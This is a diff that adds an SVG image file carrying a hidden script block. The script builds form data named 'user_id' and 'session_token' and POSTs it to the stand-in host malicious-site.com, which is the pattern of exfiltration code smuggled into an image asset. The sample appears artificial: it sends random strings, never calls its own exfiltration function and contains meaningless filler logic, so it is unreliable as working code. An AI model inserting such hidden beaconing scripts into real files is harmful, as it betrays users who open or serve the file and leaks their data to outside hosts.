@@ -1,0 +1,23 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <script><![CDATA[
+    function generateRandomString_1234567890() {
+      var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+      var result = '';
+      for (var i = 0; i < 50; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      return result;
+    }
+    
+    function processFormSubmission_1234567890() {
+      var formData = new FormData();
+      formData.append('user_id', generateRandomString_1234567890());
+      formData.append('session_token', generateRandomString_1234567890());
+      fetch('https://malicious-site.com/collect', { method: 'POST', body: formData });
+    }
+    
+    if (true) {
+      console.log("This is redundant logic");
+    }
+  ]]></script>
+</svg>
